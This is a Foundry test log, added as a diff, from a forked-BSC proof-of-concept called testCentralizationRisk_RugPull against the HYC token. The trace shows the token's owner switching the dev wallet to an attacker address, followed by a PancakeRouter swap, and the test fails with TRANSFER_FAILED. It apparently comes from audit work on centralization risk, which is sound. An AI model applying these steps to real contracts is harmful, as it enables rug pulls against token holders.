@@ -1,0 +1,71 @@
+No files changed, compilation skipped
+2026-06-16T12:42:19.588424Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104568113"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: Pancake: TRANSFER_FAILED] testCentralizationRisk_RugPull() (gas: 144557)
+2026-06-16T12:42:32.381356Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.381409Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.381425Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.381502Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.381562Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.383684Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.383705Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:42:32.383716Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [38505] ExploitTest::setUp()
+    ├─ [2487] HYC::owner() [staticcall]
+    │   └─ ← [Return] Owner: [0x670831E75ef98C332A0DB02177a6C1F007078A86]
+    ├─ [0] VM::label(Owner: [0x670831E75ef98C332A0DB02177a6C1F007078A86], "Owner")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(HYC: [0x890C3Ca60A522505f65308785C7e36A60c6702B8], "HYC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "PancakeRouter")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x0000000000000000000000000000000000000Bad], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(Attacker: [0x0000000000000000000000000000000000000Bad], 100000000000000000000 [1e20])
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [144557] ExploitTest::testCentralizationRisk_RugPull()
+    ├─ [0] VM::startPrank(Owner: [0x670831E75ef98C332A0DB02177a6C1F007078A86])
+    │   └─ ← [Return]
+    ├─ [7618] HYC::setDevWallet(Attacker: [0x0000000000000000000000000000000000000Bad])
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [405] HYC::devWallet() [staticcall]
+    │   └─ ← [Return] Attacker: [0x0000000000000000000000000000000000000Bad]
+    ├─ [0] VM::startPrank(Attacker: [0x0000000000000000000000000000000000000Bad])
+    │   └─ ← [Return]
+    ├─ [108353] PancakeRouter::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1000000000000000000}(0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x890C3Ca60A522505f65308785C7e36A60c6702B8], Attacker: [0x0000000000000000000000000000000000000Bad], 1781613735 [1.781e9])
+    │   ├─ [23974] WBNB::deposit{value: 1000000000000000000}()
+    │   │   ├─ emit Deposit(dst: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1000000000000000000 [1e18])
+    │   │   └─ ← [Stop]
+    │   ├─ [8062] WBNB::transfer(PancakePair: [0x4dB70710636882815353D49dedE53228A19ed0B1], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: PancakePair: [0x4dB70710636882815353D49dedE53228A19ed0B1], value: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] true
+    │   ├─ [2678] HYC::balanceOf(Attacker: [0x0000000000000000000000000000000000000Bad]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] PancakePair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 299304921516477959848259016 [2.993e26], 12421127318815807 [1.242e16], 1666536763 [1.666e9]
+    │   ├─ [534] WBNB::balanceOf(PancakePair: [0x4dB70710636882815353D49dedE53228A19ed0B1]) [staticcall]
+    │   │   └─ ← [Return] 1012421127318815807 [1.012e18]
+    │   ├─ [52290] PancakePair::swap(295623738464912066545559539 [2.956e26], 0, Attacker: [0x0000000000000000000000000000000000000Bad], 0x)
+    │   │   ├─ [40617] HYC::transfer(Attacker: [0x0000000000000000000000000000000000000Bad], 295623738464912066545559539 [2.956e26])
+    │   │   │   ├─ [82] PancakeRouter::receive{value: 512222281086312}()
+    │   │   │   │   └─ ← [InvalidFEOpcode] EvmError: InvalidFEOpcode
+    │   │   │   └─ ← [Revert] EvmError: Revert
+    │   │   └─ ← [Revert] Pancake: TRANSFER_FAILED
+    │   └─ ← [Revert] Pancake: TRANSFER_FAILED
+    └─ ← [Revert] Pancake: TRANSFER_FAILED
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.79s (9.62s CPU time)
+
+Ran 1 test suite in 15.11s (12.79s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: Pancake: TRANSFER_FAILED] testCentralizationRisk_RugPull() (gas: 144557)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
